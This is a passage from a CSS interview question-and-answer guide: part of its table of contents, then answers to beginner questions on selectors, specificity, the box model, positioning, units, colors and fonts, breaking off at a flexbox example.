- [362: How does `fr` share space when content is bigger than the share?](#362-how-does-fr-share-space-when-content-is-bigger-than-the-share)
- [363: What are some details of subgrid that people miss?](#363-what-are-some-details-of-subgrid-that-people-miss)
- [364: Is there a performance difference between grid and flexbox for large lists?](#364-is-there-a-performance-difference-between-grid-and-flexbox-for-large-lists)
- [365: What are the tricky margin collapsing cases?](#365-what-are-the-tricky-margin-collapsing-cases)
- [366: What is an inline formatting context and a line box?](#366-what-is-an-inline-formatting-context-and-a-line-box)
- [367: Why do inline-blocks with different content not line up at the top?](#367-why-do-inline-blocks-with-different-content-not-line-up-at-the-top)
- [368: What does `text-box` (`text-box-trim`) do?](#368-what-does-text-box-text-box-trim-do)
- [369: Why doesn't text look vertically centered even with flexbox?](#369-why-doesnt-text-look-vertically-centered-even-with-flexbox)
- [370: What happens with sub-pixel values?](#370-what-happens-with-sub-pixel-values)
- [371: How do you draw a true 1px hairline on high-DPI screens?](#371-how-do-you-draw-a-true-1px-hairline-on-high-dpi-screens)
- [372: Why does text look blurry after a transform?](#372-why-does-text-look-blurry-after-a-transform)
- [373: What was the `translateZ(0)` hack, and should you still use it?](#373-what-was-the-translatez0-hack-and-should-you-still-use-it)
- [374: What does `in oklch` mean in a gradient?](#374-what-does-in-oklch-mean-in-a-gradient)
- [375: What is gamut mapping?](#375-what-is-gamut-mapping)
- [376: How do you design for forced colors mode in depth?](#376-how-do-you-design-for-forced-colors-mode-in-depth)
- [377: What is the accessibility impact of different ways of hiding content?](#377-what-is-the-accessibility-impact-of-different-ways-of-hiding-content)
- [378: How can CSS help manage focus and keyboard use?](#378-how-can-css-help-manage-focus-and-keyboard-use)
- [379: How should view transitions handle reduced motion?](#379-how-should-view-transitions-handle-reduced-motion)
- [380: What should you watch for when supporting RTL at scale?](#380-what-should-you-watch-for-when-supporting-rtl-at-scale)
- [381: What CSS issues come up with internationalization beyond RTL?](#381-what-css-issues-come-up-with-internationalization-beyond-rtl)
- [382: How can CSS be used to steal data?](#382-how-can-css-be-used-to-steal-data)
- [383: How does Content Security Policy affect CSS?](#383-how-does-content-security-policy-affect-css)
- [384: What is clickjacking and how does CSS relate to it?](#384-what-is-clickjacking-and-how-does-css-relate-to-it)
- [385: How would you safely let users customise styles?](#385-how-would-you-safely-let-users-customise-styles)
- [386: Why are `:visited` styles limited?](#386-why-are-visited-styles-limited)
- [387: What are the risks of loading third-party CSS?](#387-what-are-the-risks-of-loading-third-party-css)
- [388: Why can't a container query check the container's own size, and why is `inline-size` the usual choice?](#388-why-cant-a-container-query-check-the-containers-own-size-and-why-is-inline-size-the-usual-choice)
- [389: How can you use style queries for component variants?](#389-how-can-you-use-style-queries-for-component-variants)
- [390: How do you use `:has()` for state-based styling, and what are the pitfalls?](#390-how-do-you-use-has-for-state-based-styling-and-what-are-the-pitfalls)
- [391: What is the specificity gotcha with native nesting?](#391-what-is-the-specificity-gotcha-with-native-nesting)
- [392: What are the pitfalls of where you put `&` in nested rules?](#392-what-are-the-pitfalls-of-where-you-put--in-nested-rules)
- [393: How do `@import` with `layer()`, `supports()` and media conditions work together?](#393-how-do-import-with-layer-supports-and-media-conditions-work-together)
- [394: How do you share breakpoints between CSS and JavaScript?](#394-how-do-you-share-breakpoints-between-css-and-javascript)
- [395: When do you use `matchMedia`, `ResizeObserver` or container queries?](#395-when-do-you-use-matchmedia-resizeobserver-or-container-queries)
- [396: How do CSS animations compare to JavaScript animations?](#396-how-do-css-animations-compare-to-javascript-animations)
- [397: What does `animation-composition` do?](#397-what-does-animation-composition-do)
- [398: What is a CSS motion path?](#398-what-is-a-css-motion-path)
- [399: What are scroll-state container queries?](#399-what-are-scroll-state-container-queries)
- [400: What is scroll anchoring?](#400-what-is-scroll-anchoring)
- [401: How do you keep a large CSS codebase maintainable?](#401-how-do-you-keep-a-large-css-codebase-maintainable)
- [402: How should a component library write its CSS so apps can customise it?](#402-how-should-a-component-library-write-its-css-so-apps-can-customise-it)
- [403: How do you build a fluid spacing and type scale?](#403-how-do-you-build-a-fluid-spacing-and-type-scale)
- [404: When do you choose CSS backgrounds versus `<img>`/`<picture>` for responsive images?](#404-when-do-you-choose-css-backgrounds-versus-imgpicture-for-responsive-images)
- [405: What advanced print features does CSS have?](#405-what-advanced-print-features-does-css-have)
- [406: Why is CSS for emails different?](#406-why-is-css-for-emails-different)
- [407: How do you decide which browsers to support?](#407-how-do-you-decide-which-browsers-to-support)
- [408: Why are CSS polyfills hard to write?](#408-why-are-css-polyfills-hard-to-write)
- [409: How do you detect CSS support from JavaScript?](#409-how-do-you-detect-css-support-from-javascript)
- [410: What does `@supports selector()` let you do?](#410-what-does-supports-selector-let-you-do)
- [411: A page has a horizontal scrollbar on mobile. How do you find the cause?](#411-a-page-has-a-horizontal-scrollbar-on-mobile-how-do-you-find-the-cause)
- [412: Why does a `100vh` section cut off content on mobile, and how do you fix it?](#412-why-does-a-100vh-section-cut-off-content-on-mobile-and-how-do-you-fix-it)
- [413: How do you handle hover styles that "stick" on touch devices?](#413-how-do-you-handle-hover-styles-that-stick-on-touch-devices)
- [414: How do you lock page scroll when a modal is open without layout shift?](#414-how-do-you-lock-page-scroll-when-a-modal-is-open-without-layout-shift)
- [415: Animations stutter on cheap Android phones. How do you investigate?](#415-animations-stutter-on-cheap-android-phones-how-do-you-investigate)
- [416: After adding `:has()` selectors, style recalculation got slow. What do you do?](#416-after-adding-has-selectors-style-recalculation-got-slow-what-do-you-do)
- [417: A third-party widget is breaking your styles, or your styles are breaking it. What are your options?](#417-a-third-party-widget-is-breaking-your-styles-or-your-styles-are-breaking-it-what-are-your-options)
- [418: How do you handle images and shadows in dark mode?](#418-how-do-you-handle-images-and-shadows-in-dark-mode)
- [419: How do you make cards in a row line up their titles, text and buttons?](#419-how-do-you-make-cards-in-a-row-line-up-their-titles-text-and-buttons)
- [420: How do you make a data table work on small screens?](#420-how-do-you-make-a-data-table-work-on-small-screens)
- [421: A layout with a sidebar breaks when the sidebar content is wide. How do you fix it?](#421-a-layout-with-a-sidebar-breaks-when-the-sidebar-content-is-wide-how-do-you-fix-it)
- [422: A dropdown inside an `overflow: hidden` card gets cut off. How do you fix it?](#422-a-dropdown-inside-an-overflow-hidden-card-gets-cut-off-how-do-you-fix-it)
- [423: How do you align icons with text?](#423-how-do-you-align-icons-with-text)
- [424: What are the `lh`, `rlh`, `cap` and `ic` units?](#424-what-are-the-lh-rlh-cap-and-ic-units)
- [425: How do viewport units behave with scrollbars and the on-screen keyboard?](#425-how-do-viewport-units-behave-with-scrollbars-and-the-on-screen-keyboard)
- [426: What does the CSS `zoom` property do now?](#426-what-does-the-css-zoom-property-do-now)
- [427: How do you choose between cascade layers, `@scope` and CSS Modules?](#427-how-do-you-choose-between-cascade-layers-scope-and-css-modules)
- [428: How would you migrate a large Sass codebase to modern CSS?](#428-how-would-you-migrate-a-large-sass-codebase-to-modern-css)
- [429: What do you look for when reviewing a CSS pull request?](#429-what-do-you-look-for-when-reviewing-a-css-pull-request)
- [430: How do you measure CSS performance?](#430-how-do-you-measure-css-performance)
- [431: How can CSS affect Interaction to Next Paint (INP)?](#431-how-can-css-affect-interaction-to-next-paint-inp)
- [432: What is the `shape()` function?](#432-what-is-the-shape-function)
- [433: What is the difference between computed, used and resolved values?](#433-what-is-the-difference-between-computed-used-and-resolved-values)
- [434: Why does inheritance use the computed value, and when does that cause bugs?](#434-why-does-inheritance-use-the-computed-value-and-when-does-that-cause-bugs)
- [435: How does a CSS-only toggle (checkbox hack) compare to modern options?](#435-how-does-a-css-only-toggle-checkbox-hack-compare-to-modern-options)
- [436: How do you build a sticky element that changes appearance when it gets stuck?](#436-how-do-you-build-a-sticky-element-that-changes-appearance-when-it-gets-stuck)
- [437: How do `transition` and `@starting-style` handle elements added to the DOM?](#437-how-do-transition-and-starting-style-handle-elements-added-to-the-dom)
- [438: How do you stagger an animation over a list in CSS?](#438-how-do-you-stagger-an-animation-over-a-list-in-css)
- [439: What are `:open`, `:popover-open` and `:modal`?](#439-what-are-open-popover-open-and-modal)
- [440: What is the `reading-flow` property?](#440-what-is-the-reading-flow-property)
- [441: How does `color-scheme` affect elements and iframes?](#441-how-does-color-scheme-affect-elements-and-iframes)
- [442: Why do layout bugs sometimes only appear after fonts load?](#442-why-do-layout-bugs-sometimes-only-appear-after-fonts-load)
- [443: What's the difference between hiding content with `content-visibility: hidden` and `display: none`?](#443-whats-the-difference-between-hiding-content-with-content-visibility-hidden-and-display-none)
- [444: How do you keep visual order and DOM order in sync in responsive layouts?](#444-how-do-you-keep-visual-order-and-dom-order-in-sync-in-responsive-layouts)
- [445: How would you build a pure CSS carousel with good accessibility?](#445-how-would-you-build-a-pure-css-carousel-with-good-accessibility)
- [446: How do you check color contrast, and what are the rules?](#446-how-do-you-check-color-contrast-and-what-are-the-rules)
- [447: What should you know about CSS `transition` on custom properties?](#447-what-should-you-know-about-css-transition-on-custom-properties)
- [448: How do you write CSS for very large DOMs (for example a spreadsheet or log viewer)?](#448-how-do-you-write-css-for-very-large-doms-for-example-a-spreadsheet-or-log-viewer)
- [449: What happens from downloading a CSS file to pixels on screen?](#449-what-happens-from-downloading-a-css-file-to-pixels-on-screen)
- [450: When should you not solve something with CSS?](#450-when-should-you-not-solve-something-with-css)

---

## Easy Questions (1-150)

### 1: What is CSS?

CSS (Cascading Style Sheets) is the language used to style web pages. HTML gives the page its structure and content. CSS controls how it looks: colors, fonts, spacing and layout, and how all of that changes at different screen sizes. One stylesheet can style many pages, so a design change only has to be made in one place.

### 2: What are the ways to add CSS to a page?

There are three:

1. **External stylesheet**: a `.css` file linked with `<link>`. This is the normal choice for real projects.
2. **Internal stylesheet**: a `<style>` block inside the HTML document.
3. **Inline styles**: a `style` attribute on an element.

```html
<link rel="stylesheet" href="styles.css" />

<style>
  h1 {
    color: navy;
  }
</style>

<p style="color: red;">Inline style</p>
```

Inline styles have the highest priority of the three, but they are hard to reuse and maintain.

### 3: What does a CSS rule look like?

A rule has a selector, followed by a block of declarations in curly braces. Each declaration is a property and a value, with a semicolon at the end.

```css
h1 {
  color: navy;
  font-size: 2rem;
}
```

Here `h1` is the selector, `color` and `font-size` are properties, and `navy` and `2rem` are values.

### 4: What is a selector?

A selector tells the browser which elements a rule applies to. It can match by tag name (`p`), class (`.card`), id (`#header`), attribute (`[type="email"]`), state (`:hover`), or by where the element sits in the document (`nav a`).

### 5: What is the difference between type, class and id selectors?

- **Type selector** (`p`) matches every element with that tag name.
- **Class selector** (`.button`) matches every element that has that class. One element can have many classes, and a class can be used on many elements.
- **ID selector** (`#main`) matches the single element with that id. An id should be unique on the page.

Most teams style with classes and avoid ids. Ids have very high specificity, which makes them hard to override later.

### 6: What does the universal selector `*` do?

`*` matches every element. It's mostly used in resets, for example to set `box-sizing` on everything.

```css
*,
*::before,
*::after {
  box-sizing: border-box;
}
```

It has zero specificity, so it doesn't make the rules that use it harder to override.

### 7: How do you apply the same styles to several selectors?

Separate the selectors with commas:

```css
h1,
h2,
h3 {
  font-family: Georgia, serif;
}
```

In a normal selector list, if one selector is invalid the whole rule is dropped. `:is()` and `:where()` are "forgiving": they skip the invalid selector and keep the rest.

### 8: What is the difference between the descendant and child combinators?

- `nav a` (a space) is the **descendant combinator**. It matches any `a` inside `nav`, at any depth.
- `nav > a` is the **child combinator**. It only matches `a` elements that are direct children of `nav`.

```css
ul li {
  color: gray;
} /* every li inside the ul, including nested lists */
ul > li {
  color: black;
} /* only the top-level li elements */
```

### 9: What is the difference between `+` and `~` combinators?

- `h2 + p` (**next-sibling combinator**) matches a `p` that comes right after an `h2` and has the same parent.
- `h2 ~ p` (**subsequent-sibling combinator**) matches every `p` that comes after an `h2` and has the same parent. It doesn't have to come right after.

Both only look forward. To style an element based on something that comes after it, use `:has()`.

### 10: What are attribute selectors?

They match elements based on their attributes and attribute values.

```css
[disabled] {
  opacity: 0.5;
} /* has the attribute */
[type="email"] {
  border-color: blue;
} /* exact value */
a[href^="https"] {
  color: green;
} /* starts with */
a[href$=".pdf"]::after {
  content: " (PDF)";
} /* ends with */
[class*="icon-"] {
  display: inline-block;
} /* contains */
[lang|="en"] {
  quotes: "\201C" "\201D";
} /* "en" or starts with "en-" */
```

Add ` i` before the closing bracket to make the value match case-insensitive: `[type="EMAIL" i]`.

### 11: What is a pseudo-class?

A pseudo-class selects an element based on its state or position, not on its tag, class or id. It starts with a single colon.

```css
a:hover {
  text-decoration: underline;
}
input:focus {
  outline: 2px solid blue;
}
li:first-child {
  font-weight: bold;
}
input:disabled {
  background: #eee;
}
```

### 12: What is a pseudo-element?

A pseudo-element styles part of an element, or adds generated content that isn't in the HTML. It uses two colons.

```css
p::first-line {
  font-weight: bold;
}
.required::after {
  content: " *";
  color: red;
}
::selection {
  background: yellow;
}
```

`::before` and `::after` are the most common ones. They don't show up unless you set `content`.

### 13: What is the difference between `:` and `::`?

A single colon is for pseudo-classes (`:hover`) and a double colon is for pseudo-elements (`::before`). Before CSS3, pseudo-elements also used one colon, so browsers still accept `:before` and `:after` for older code. In new code, use `::`.

### 14: What does "cascading" mean in CSS?

The cascade is the set of rules a browser uses when more than one declaration sets the same property on the same element. It checks these, in this order:

1. Origin and importance (browser defaults, user styles, author styles, and whether the declaration is `!important`).
2. Cascade layers.
3. Specificity.
4. Source order. If everything else is equal, the declaration that comes last wins.

### 15: What is specificity?

Specificity is a score the browser gives each selector. When two rules set the same property on the same element, the selector with the higher score wins, whatever their order in the file. An id is worth more than a class, and a class is worth more than a tag name.

### 16: How do you calculate specificity?

It's written as three numbers (A, B, C):

- **A**: number of id selectors.
- **B**: number of classes, attribute selectors and pseudo-classes.
- **C**: number of type selectors and pseudo-elements.

Compare A first, then B, then C.

```css
p                 /* (0,0,1) */
.card p           /* (0,1,1) */
#nav .link:hover  /* (1,2,0) */
ul li a::before   /* (0,0,4) */
```

`*` and combinators add nothing. Inline styles beat any selector, and `!important` beats normal declarations.

### 17: What does `!important` do and when should you use it?

`!important` makes a declaration win over normal declarations, no matter the specificity. It's hard to override. You need another `!important` with a higher priority, which leads to `!important` wars.

```css
.hidden {
  display: none !important;
}
```

Fair uses are utility classes that must always apply, and overriding inline styles from a third-party script you can't change. Don't use it to fix specificity problems you created yourself.

### 18: What is inheritance in CSS?

Some properties pass their value from a parent element down to its children. Text properties like `color`, `font-family`, `font-size`, `line-height` and `visibility` inherit. Box properties like `margin`, `padding`, `border`, `width` and `background` don't.

```css
body {
  font-family: system-ui, sans-serif;
  color: #222;
}
/* every element inside body gets this font and color unless it sets its own */
```

### 19: What do `inherit`, `initial`, `unset` and `revert` do?

They are keywords that work on any property:

- `inherit`: use the parent's value.
- `initial`: use the property's default from the spec. For `display`, that's `inline`, even on a `div`.
- `unset`: act like `inherit` for properties that inherit and like `initial` for those that don't.
- `revert`: go back to what the previous origin would give, usually the browser's default style. For a `div`, `display: revert` gives `block`.

There is also `revert-layer`, which goes back to the value from the previous cascade layer.

### 20: What is the CSS box model?

Every element is drawn as a rectangular box made of four layers, from the inside out:

1. **Content**: the text or image.
2. **Padding**: space between the content and the border.
3. **Border**: the line around the padding.
4. **Margin**: space outside the border that pushes other elements away.

The background covers the content, the padding and the area under the border. The margin is always transparent.

### 21: What is the difference between `content-box` and `border-box`?

They change what `width` and `height` measure.

- `content-box` (the default): `width` is only the content. Padding and border are added on top.
- `border-box`: `width` includes the content, the padding and the border.

```css
.box {
  width: 200px;
  padding: 20px;
  border: 5px solid;
}
/* content-box: the box takes 250px */
/* border-box: the box takes 200px, the content area shrinks to 150px */
```

`border-box` is easier to work with, which is why most resets use it.

### 22: How do you make every element use `border-box`?

```css
*,
*::before,
*::after {
  box-sizing: border-box;
}
```

Some people set it on `html` and use `box-sizing: inherit` on everything else. That lets a component switch back to `content-box` for its whole subtree. Both versions are common.

### 23: What is the difference between margin and padding?

Padding is space inside the element, between its content and its border. Margin is space outside the border, between this element and others. Padding gets the element's background. Margin is always transparent. Vertical margins between blocks can collapse, but padding never does.

### 24: What is margin collapsing?

When two vertical margins of block elements touch, they merge into one margin, and its size is the larger of the two. They aren't added together.

```css
h2 {
  margin-bottom: 30px;
}
p {
  margin-top: 20px;
}
/* the gap between them is 30px, not 50px */
```

This also happens between a parent and its first or last child, if no border, padding or inline content sits between them. It doesn't happen with horizontal margins, inside flex or grid containers, or for floated and absolutely positioned elements.

### 25: How do the margin and padding shorthands work with 1, 2, 3 or 4 values?

They go clockwise from the top:

```css
margin: 10px; /* all four sides */
margin: 10px 20px; /* top/bottom, left/right */
margin: 10px 20px 30px; /* top, left/right, bottom */
margin: 10px 20px 30px 40px; /* top, right, bottom, left */
```

To remember the order, think of the word "TRouBLe" (Top, Right, Bottom, Left).

### 26: What is the difference between `block`, `inline` and `inline-block`?

- **block**: starts on a new line and fills the available width. `width`, `height`, margin and padding all work as you'd expect. Examples: `div`, `p`, `h1`.
- **inline**: flows inside a line of text. It ignores `width` and `height`, and its vertical margin and padding don't push other lines away. Examples: `span`, `a`, `strong`.
- **inline-block**: sits in the line like inline, but accepts `width`, `height` and vertical spacing like a block.

### 27: What is the difference between `display: none`, `visibility: hidden` and `opacity: 0`?

|                      | Takes up space | Can be clicked | Read by screen readers |
| -------------------- | -------------- | -------------- | ---------------------- |
| `display: none`      | No             | No             | No                     |
| `visibility: hidden` | Yes            | No             | No                     |
| `opacity: 0`         | Yes            | Yes            | Yes                    |

`opacity` and `visibility` can be animated. Since 2024 you can also animate to and from `display: none` with `transition-behavior: allow-discrete` and `@starting-style`.

### 28: What is `position: static`?

It's the default for every element. The element sits in the normal document flow, and `top`, `right`, `bottom`, `left` and `z-index` have no effect on it.

### 29: What does `position: relative` do?

The element stays in the normal flow, but you can move it with `top`, `left` and the other offsets. Its original space is kept, so other elements don't move. It's mostly used to make the element the reference point for absolutely positioned children.

```css
.card {
  position: relative;
}
.badge {
  position: absolute;
  top: 8px;
  right: 8px;
}
```

### 30: What does `position: absolute` do?

The element is taken out of the normal flow, so other elements act like it isn't there. Its position is set by the offsets, measured from the nearest ancestor that is positioned (anything other than `static`). If there is no such ancestor, it's measured from the initial containing block, which has the size of the viewport and sits at the top of the page.

### 31: What does `position: fixed` do?

The element is taken out of the flow and positioned relative to the viewport, so it stays in place when the page scrolls. It's used for headers, chat buttons and cookie banners. If an ancestor has a `transform`, `filter` or a few similar properties, the element becomes fixed to that ancestor instead of the viewport.

### 32: What does `position: sticky` do?

The element acts like `relative` until you scroll past a threshold you set, then it sticks like `fixed`, but only inside its parent.

```css
.table-header {
  position: sticky;
  top: 0;
}
```

It needs at least one offset (`top`, `bottom`, etc.). It stops working if an ancestor between it and the scroll container has `overflow: hidden`, `auto` or `scroll`.

### 33: What is `z-index`?

`z-index` decides which elements appear on top when they overlap. A higher value is closer to the viewer. It works on positioned elements (not `static`) and on flex and grid items. The value is only compared with other elements in the same stacking context. That's why `z-index: 9999` sometimes doesn't help.

### 34: Why does `z-index` sometimes have no effect?

The usual reasons:

1. The element is `position: static` and isn't a flex or grid item.
2. The element is inside a parent that created its own stacking context with a lower level. A child can never appear above something that is above its parent's stacking context.
3. The other element comes later in the source and has the same or a higher `z-index` in the same context.

Use DevTools (the Layers panel in Chrome, or the 3D View in Edge) to see which stacking contexts exist.

### 35: What do `float` and `clear` do?

`float: left` or `float: right` moves an element to one side and lets text and inline content wrap around it. `clear` stops an element from sitting next to floats that come before it.

```css
img.avatar {
  float: left;
  margin-right: 1rem;
}
.footer {
  clear: both;
}
```

Floats were used for page layout for years. Today that job belongs to flexbox and grid. Use floats for what they were made for: wrapping text around an image.

### 36: What is a clearfix?

A parent that only has floated children collapses to zero height, because floats are out of the normal flow. The old fix was a "clearfix" hack:

```css
.clearfix::after {
  content: "";
  display: table;
  clear: both;
}
```

The modern way is `display: flow-root` on the parent. It creates a new block formatting context, so the parent contains its floats with no hack.

```css
.container {
  display: flow-root;
}
```

### 37: What are the values of `overflow`?

`overflow` controls what happens when content is bigger than its box.

- `visible` (default): the content spills out.
- `hidden`: the extra content is cut off. It can still be scrolled with code.
- `clip`: like `hidden`, but no scrolling at all, even with code, and it doesn't create a scroll container.
- `scroll`: always shows scrollbars.
- `auto`: shows scrollbars only when needed.

You can set each axis on its own with `overflow-x` and `overflow-y`.

### 38: What is the difference between `px`, `em` and `rem`?

- `px` is a fixed unit. One CSS pixel isn't always one device pixel.
- `em` is relative to the element's own font size. When used on `font-size`, it's relative to the parent's font size.
- `rem` is relative to the root (`html`) font size, which is usually 16px.

```css
html {
  font-size: 100%;
} /* usually 16px */
h1 {
  font-size: 2rem;
} /* 32px */
.btn {
  padding: 0.5em 1em;
} /* scales with the button's own font size */
```

Use `rem` for font sizes so they respect the user's browser settings. `em` is handy for spacing that should grow with the text, like button padding.

### 39: What is the `%` unit relative to?

It depends on the property:

- `width`, and `left`/`right`: the width of the containing block.
- `height`, and `top`/`bottom`: the height of the containing block. It only works if that height is defined.
- `padding` and `margin`: always the **width** of the containing block, even for top and bottom.
- `font-size`: the parent's font size.
- `transform: translate()`: the element's own size.

### 40: What are `vw` and `vh`?

`1vw` is 1% of the viewport width and `1vh` is 1% of the viewport height. `vmin` and `vmax` use whichever side is smaller or larger.

```css
.hero {
  height: 100vh;
}
h1 {
  font-size: 5vw;
}
```

On mobile, `100vh` is often taller than the area you can actually see, because the browser's address bar shows and hides as you scroll. The newer `dvh`, `svh` and `lvh` units were added to fix this.

### 41: What are `svh`, `lvh` and `dvh`?

They are viewport units that know about mobile browser toolbars:

- `svh` (small): the viewport height when the toolbars are showing. This is the smallest size.
- `lvh` (large): the height when the toolbars are hidden. This is the largest size.
- `dvh` (dynamic): changes as the toolbars show and hide.

```css
.full-screen {
  min-height: 100svh; /* never taller than the visible area */
}
```

`dvh` changes while the user scrolls, which can cause layout to jump. `svh` is usually the safer choice for full-screen sections. There are matching width units (`svw`, `lvw`, `dvw`) and inline/block versions.

### 42: What are the `ch` and `ex` units?

`ch` is the width of the "0" character in the current font. `ex` is the x-height (the height of a lowercase "x"). `ch` is a common way to limit line length so text is easy to read:

```css
article {
  max-width: 65ch;
}
```

### 43: What color formats does CSS support?

```css
color: tomato; /* named color */
color: #ff6347; /* hex */
color: #f63; /* short hex */
color: rgb(255 99 71); /* rgb */
color: hsl(9 100% 64%); /* hue, saturation, lightness */
color: oklch(70% 0.19 35); /* lightness, chroma, hue */
color: color(display-p3 1 0.4 0.3); /* wide gamut */
```

`hsl()` and `oklch()` are easier to tweak by hand than hex. `oklch()` also keeps brightness more consistent between different hues.

### 44: How do you add transparency to a color?

Add an alpha value. Modern syntax uses spaces and a slash. The older comma syntax and `rgba()`/`hsla()` still work.

```css
background: rgb(0 0 0 / 50%);
background: hsl(220 90% 50% / 0.3);
background: #00000080; /* 8-digit hex, last two digits are alpha */
background: rgba(0, 0, 0, 0.5); /* older syntax */
```

### 45: What is `currentColor`?

`currentColor` is a keyword that means "the value of this element's `color` property". It's useful for borders, SVG icons and shadows that should always match the text color.

```css
.button {
  color: purple;
  border: 2px solid currentColor;
}
.icon {
  fill: currentColor;
}
```

### 46: What is the difference between `opacity` and an alpha color?

`opacity` makes the whole element see-through, including its text and all its children. An alpha color only affects the property it's used on.

```css
.overlay {
  opacity: 0.5;
} /* text gets faded too */
.overlay {
  background: rgb(0 0 0 / 50%);
} /* only the background is faded */
```

An `opacity` below 1 also creates a new stacking context.

### 47: How does `font-family` work?

You give a list of fonts. The browser uses the first one that's available, and the list should end with a generic family as the last fallback.

```css
body {
  font-family: "Inter", "Helvetica Neue", Arial, sans-serif;
}
```

Generic families include `serif`, `sans-serif`, `monospace`, `cursive`, `system-ui` and `ui-monospace`. Put quotes around names that contain spaces.

### 48: Which properties control font size, weight and style?

```css
p {
  font-size: 1rem;
  font-weight: 400; /* normal; 700 is bold */
  font-style: italic;
}
```

There is also a `font` shorthand: `font: italic 700 1rem/1.5 system-ui, sans-serif;`. It resets every font property you leave out, so be careful with it.

### 49: Why should `line-height` usually have no unit?

A unitless value like `1.5` is passed down to children as a multiplier, so each child works out its own line height from its own font size. With a unit like `24px` or `1.5em`, children inherit the final computed number, which may be too small for larger headings.

```css
body {
  line-height: 1.5;
} /* good */
body {
  line-height: 1.5em;
} /* children get a fixed px value */
```

### 50: Which properties are used to style text?

```css
h1 {
  text-align: center; /* left, right, center, justify, start, end */
  text-decoration: underline; /* none, underline, line-through */
  text-transform: uppercase; /* lowercase, capitalize */
  text-indent: 2em;
}
```

`text-decoration` is a shorthand. You can set the line, style, color and thickness: `text-decoration: underline wavy red 2px;`. `text-underline-offset` moves the underline away from the text.

### 51: What do `letter-spacing` and `word-spacing` do?

`letter-spacing` adds or removes space between characters, and `word-spacing` does the same between words. Both accept negative values.

```css
.label {
  text-transform: uppercase;
  letter-spacing: 0.05em;
}
```

Use `em` so the spacing grows and shrinks with the font size.

### 52: What does the `white-space` property do?

It controls how spaces and line breaks in the source are handled.

- `normal`: spaces collapse into one and lines wrap.
- `nowrap`: spaces collapse, but the text never wraps.
- `pre`: keeps spaces and line breaks, no wrapping (like `<pre>`).
- `pre-wrap`: keeps spaces and line breaks, and still wraps.
- `pre-line`: collapses spaces, keeps line breaks, and wraps.

In newer browsers, `white-space` is a shorthand for `white-space-collapse` and `text-wrap-mode`.

### 53: How do you cut off long text with "..."?

You need all three of these on a block with a set width:

```css
.title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
```

This only works for one line. For several lines, use `line-clamp`.

### 54: What is `@font-face`?

`@font-face` loads a custom font file and gives it a name you can use in `font-family`.

```css
@font-face {
  font-family: "Inter";
  src: url("/fonts/inter.woff2") format("woff2");
  font-weight: 100 900;
  font-style: normal;
  font-display: swap;
}

body {
  font-family: "Inter", sans-serif;
}
```

WOFF2 is the format to use today. It's compressed and every modern browser supports it.

### 55: What is a system font stack?

It's a `font-family` list that uses the operating system's own UI font, so nothing has to be downloaded.

```css
body {
  font-family:
    system-ui,
    -apple-system,
    "Segoe UI",
    Roboto,
    sans-serif;
}
```

Text shows up instantly with no layout shift. The trade-off is that the font looks a little different on each OS.

### 56: What are the main background properties?

```css
.hero {
  background-color: #222;
  background-image: url("hero.jpg");
  background-repeat: no-repeat;
  background-position: center;
  background-size: cover;
  background-attachment: scroll; /* or fixed, local */
  background-clip: border-box; /* or padding-box, content-box, text */
}
```

The `background` shorthand sets all of them at once: `background: #222 url("hero.jpg") center / cover no-repeat;`.

### 57: Can an element have more than one background?

Yes. Separate the layers with commas. The first one is drawn on top.

```css
.banner {
  background:
    linear-gradient(rgb(0 0 0 / 60%), transparent),
    url("photo.jpg") center / cover;
}
```

This is the usual way to darken an image so text on top of it is easier to read.

### 58: What is the difference between `background-size: cover` and `contain`?

- `cover` scales the image so it fills the whole box. Parts of the image may get cut off.
- `contain` scales the image so the whole image fits inside the box. There may be empty space around it.

Both keep the image's aspect ratio.

### 59: How do you create a gradient?

Gradients are images, so they go in `background-image`.

```css
.a {
  background: linear-gradient(to right, #4f46e5, #ec4899);
}
.b {
  background: linear-gradient(45deg, red 0%, orange 50%, yellow 100%);
}
.c {
  background: radial-gradient(circle at top left, white, steelblue);
}
.d {
  background: conic-gradient(red, yellow, green, red);
}
.e {
  background: repeating-linear-gradient(45deg, #000 0 10px, #fff 10px 20px);
}
```

### 60: How do `border` and `border-radius` work?

```css
.card {
  border: 1px solid #ddd; /* width, style, color */
  border-radius: 8px; /* rounded corners */
}
.tab {
  border-radius: 8px 8px 0 0; /* top-left, top-right, bottom-right, bottom-left */
}
```

A border won't show without a style (`solid`, `dashed`, `dotted` and so on). The default style is `none`.

### 61: How do you make a circle?

Give the element the same width and height and set `border-radius: 50%`.

```css
.avatar {
  width: 48px;
  aspect-ratio: 1;
  border-radius: 50%;
  object-fit: cover;
}
```

For a pill shape on a rectangle, use a very large radius like `border-radius: 999px`.

### 62: What is the difference between `outline` and `border`?

A border is part of the box model, so it takes up space and can move other elements. An outline is drawn outside the border and takes up no space. Outlines are used for focus rings. You can move an outline away from the element with `outline-offset`. Modern browsers make outlines follow `border-radius`.

Never remove focus outlines without putting a visible focus style in their place.

### 63: How does `box-shadow` work?

```css
.card {
  /* x-offset y-offset blur spread color */
  box-shadow: 0 4px 12px 0 rgb(0 0 0 / 15%);
}
.input:focus {
  box-shadow: inset 0 0 0 2px royalblue; /* inner shadow */
}
.layered {
  box-shadow:
    0 1px 2px rgb(0 0 0 / 10%),
    0 8px 24px rgb(0 0 0 / 10%);
}
```

Several shadows stacked on top of each other usually look more natural than one big shadow.

### 64: How do you add a shadow to text?

```css
h1 {
  text-shadow: 1px 1px 2px rgb(0 0 0 / 40%); /* x y blur color */
}
```

There is no spread value for text shadows. You can add several shadows separated by commas.

### 65: What do `min-width`, `max-width`, `min-height` and `max-height` do?

They set limits on an element's size. `max-width` stops an element from growing past a size, and `min-width` stops it from shrinking below one. If they conflict, `min-*` wins over `max-*`, and `max-*` wins over `width`.

```css
.container {
  width: 100%;
  max-width: 1200px;
  margin-inline: auto;
}
```

### 66: What does `auto` mean for `width` and `margin`?

For a block element, `width: auto` fills the available space, minus margins, borders and padding. This is different from `width: 100%`, which ignores margins and can cause overflow.

`margin: auto` takes the leftover space. On a block with a set width, left and right `auto` margins split that space evenly, which centers the block.

### 67: How do you center a block element horizontally?

Give it a width (or `max-width`) and set its left and right margins to `auto`.

```css
.container {
  max-width: 800px;
  margin-inline: auto; /* same as margin-left: auto; margin-right: auto; */
}
```

### 68: How do you center text?

`text-align: center` centers inline content, like text, images and inline-blocks, inside a block. It doesn't center the block itself.

```css
.hero {
  text-align: center;
}
```

### 69: What is Flexbox?

Flexbox (`display: flex`) is a layout model for laying out items in one direction, either a row or a column. It makes it easy to share space between items, align them, change their order and handle wrapping, without floats or hacks.

```css
.toolbar {
  display: flex;
